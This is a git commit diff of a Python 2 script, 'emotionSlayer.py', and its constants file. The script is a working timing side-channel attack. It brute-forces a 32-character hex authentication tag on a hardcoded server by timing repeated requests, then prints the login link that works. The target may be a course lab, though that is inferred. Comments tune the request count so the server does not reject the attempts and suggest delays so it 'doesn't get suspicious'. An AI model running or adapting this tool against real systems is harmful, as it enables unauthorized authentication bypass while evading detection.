277f29324bd3edfb166052be1c1e1bc78aff527c
AcollaMolla <37123861+AcollaMolla@users.noreply.github.com>
2018-10-17 14:40:24 +0200

    Add files via upload

--- timeAttack/timeAttack/constant.py
+++ timeAttack/timeAttack/constant.py
@@ -1,9 +1,13 @@
-NUMBER_OF_TESTS = 20
+NUMBER_OF_TESTS = 3 #How many login attempts to do per bit. 3 seems to work after a lot of testing. >20 is probably to much and will likely trigger rejection from the target server
 TIMEOUT = 1
-USERNAME = 'antoengm100'
-LENGTH_OF_TAG = 32
+USERNAME = 'alice'
+LENGTH_OF_TAG = 32 #Length of the hex tag
+BE_VERBOSE = False #To show additional printout
+
+#Dont touch any of below
 WARNING = '\033[93m'
 OKGREEN = '\033[92m'
 FAIL = '\033[91m'
 OKBLUE = '\033[94m'
+ERROR = '\033[41m'
 ENDC = '\033[0m'
--- timeAttack/timeAttack/emotionSlayer.py
+++ timeAttack/timeAttack/emotionSlayer.py
@@ -1,13 +1,16 @@
 import urllib2
-import string
 import time
 from requests.exceptions import HTTPError
 import timeit
 import requests
 import constant
 import sys
-from math import sqrt
-#Get rid of unused libs!
+###################################################EMOTIONSLAYER.PY#######################################################
+#This is an automated tool to crack a hex tag on a specific webpage. Customize your username, etc. in the constant.py file
+#
+#For future development: consider adding some timeout between each request so the server doesn't get suspicious. This will
+#of course cause longer waiting time but might be worth it, at least make it an optionable feature.
+###################################################EMOTIONSLAYER.PY#######################################################
 
 def toHex(tag):
 	temp = []
@@ -23,21 +26,17 @@ def sampleTime(tag):
 		try:
 			timeArray[x] = requests.get("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
 		except:
-			print "ERROR"
+			print constant.ERROR + "[ERROR]Unable to connect to server" + constant.ENDC
 	return min(timeArray)
 	
 def verifyBits(tag,pos, meanTime, longest, prevTime):
 	verified = 0
-	connectionTimes = [0.0] * 17
+	connectionTimes = [0.0] * ((constant.LENGTH_OF_TAG/2) + 1)
 	connectionTimes[pos/2] = longest
-	print (prevTime + float(constant.TIMEOUT)/1000)
-	if connectionTimes[pos/2] < (prevTime + (float(constant.TIMEOUT)/1000)):
-		print constant.WARNING + "[!]WARNING: The connection times for this byte was shorter than or equal to the preceeding. This might indicate wrong byte." + constant.ENDC#remove this print after debugging
-		#raw_input("Press Enter to continue")
-	elif connectionTimes[pos/2] > (prevTime + float(constant.TIMEOUT)/1000):
+	if connectionTimes[pos/2] > (prevTime + float(constant.TIMEOUT)/1000):
 		verified = 1
-	elif connectionTimes[pos/2] < 0:
-		print constant.WARNING + "[!]Something is very wrong..."
+	elif connectionTimes[pos/2] < (prevTime/2):
+		print constant.WARNING + "[!]Re-testing preceeding bit" + constant.ENDC
 		verified = -1
 	return verified
 	
@@ -55,13 +54,15 @@ def tryTag(tag, pos, meanTime):
 	prevTime = meanTime
 	verified = 0
 	counter = 0
+	sameBit = 0
 	prevBit = [-1] * 2
 	while pos <= (constant.LENGTH_OF_TAG - 2):
 		for x in range (constant.NUMBER_OF_TESTS):
 			timeArray[x] = requests.get("http://130.243.27.198/auth/"+ str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(tag)).elapsed.total_seconds()
-		connectionTime = min(timeArray)
-		if connectionTime > longest[0]:
-			longest[0] = connectionTime
+		if constant.BE_VERBOSE:
+			print tag
+		if min(timeArray) > longest[0]:
+			longest[0] = min(timeArray)
 			longest[1] = tag[pos]
 			longest[2] = tag[pos + 1]
 		tag = increaseTag(tag, pos)
@@ -69,35 +70,44 @@ def tryTag(tag, pos, meanTime):
 			tag[pos] = longest[1]
 			tag[pos + 1] = longest[2]
 			verified = verifyBits(tag,pos,meanTime,longest[0], prevTime)
-			if verified == 1 or counter > 2:
-				if counter > 2:
-					print "[#]The same bit keeps appearing. Assuming it's the right one"
-				print "[#]Current tag: " + str(toHex(tag) + " Time: " + str(longest[0]) + " Previous time: " + str(prevTime) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
+			if verified == 1 or sameBit > 2:
+				if sameBit > 2:
+					print constant.OKBLUE + "[#]The same bit keeps appearing. Assuming it's the right one" + constant.ENDC
+				if constant.BE_VERBOSE:
+					print "[#]Current tag: " + str(toHex(tag) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms")
+				elif constant.BE_VERBOSE == False:
+					print "[#]Current tag: " + str(toHex(tag))
 				pos += 2
 				prevTime = longest[0]
 				longest[0] = 0.0
 				counter = 0
-			elif verified == 0:
-				if prevBit[counter] == -1 or prevBit[counter + 1] == -1:
-					prevBit[counter] = tag[pos]
-					prevBit[counter + 1] = tag[pos + 1]
-				if counter > 0:
-					if prev[counter] == tag[pos] and prev[counter + 1] == tag[pos + 1]:
-						counter += 1
-						print "[#] Found matching on " + str(counter) + " retest(s). This is good!"
-				print constant.WARNING + "[#]Last 2 bits might be wrong: " + str(toHex(tag) + " Time: " + str(longest[0]) + " Previous time: " + str(prevTime) + " Delta: " + str((longest[0] - prevTime) * 1000) + " ms") + constant.ENDC
+				sameBit = 0
+			elif verified == -1 or counter > 5:
+				tag[pos] = 0
+				tag[pos+1] = 0
+				pos -= 2
+				tag[pos] = 0
+				tag[pos+1] = 0
+			elif verified == 0 and counter <= 5:
+				if counter == 0:
+					prevBit[0] = tag[pos]
+					prevBit[1] = tag[pos + 1]
+				if counter > 0 and prevBit[0] == tag[pos] and prevBit[1] == tag[pos+1]:
+					sameBit += 1
+				elif counter > 0 and prevBit[0] != tag[pos] or prevBit[1] != tag[pos+1]:
+					sameBit = 0
+				print constant.WARNING + "[!]Re-testing current bit for the " + str(counter) + " time" + constant.ENDC
 				tag[pos] = 0
 				tag[pos + 1] = 0
-			elif verified == -1:
-				pos -= 2		
+				counter += 1		
 	return tag
 
 authorized = False
 counter = 0
 previousTag = [0] * constant.LENGTH_OF_TAG
 currentTag = [0] * constant.LENGTH_OF_TAG #Create a tag containing all 0
-semiCorrectTag = [0] * constant.LENGTH_OF_TAG
 pos = 0
+start = time.time()
 while authorized == False:
 	meanTime = sampleTime(currentTag) #Calculate mean time for server parsing on currentTag
 	currentTag = tryTag(currentTag, pos, meanTime) #Find the correct tag!
@@ -105,11 +115,15 @@ while authorized == False:
 	try:
 		contents = urllib2.urlopen("http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + toHex(currentTag)).read()
 		print constant.OKGREEN + contents + constant.ENDC
+		print constant.OKGREEN + "[#] Complete link: http://130.243.27.198/auth/" + str(constant.TIMEOUT) + "/" + constant.USERNAME + "/" + str(toHex(currentTag)) + constant.ENDC
+		stop = time.time()
+		print "[#]Elapsed time: " + str(stop - start) + " sec"
+		print "[#]Elapsed time: " + str(int(stop - start)/60) + " min " + str(int(stop - start)%60) + " sec"
 		authorized = True
 	except urllib2.HTTPError as error:
 		if error.code == 401:
-			print constant.FAIL +  '[ERROR]Wrong tag!' + constant.ENDC
 			print constant.FAIL + error
+			print constant.FAIL +  '[ERROR]Wrong tag! Starting over...' + constant.ENDC
 			if counter == 0:
 				previousTag = currentTag
 			if counter > 0:	
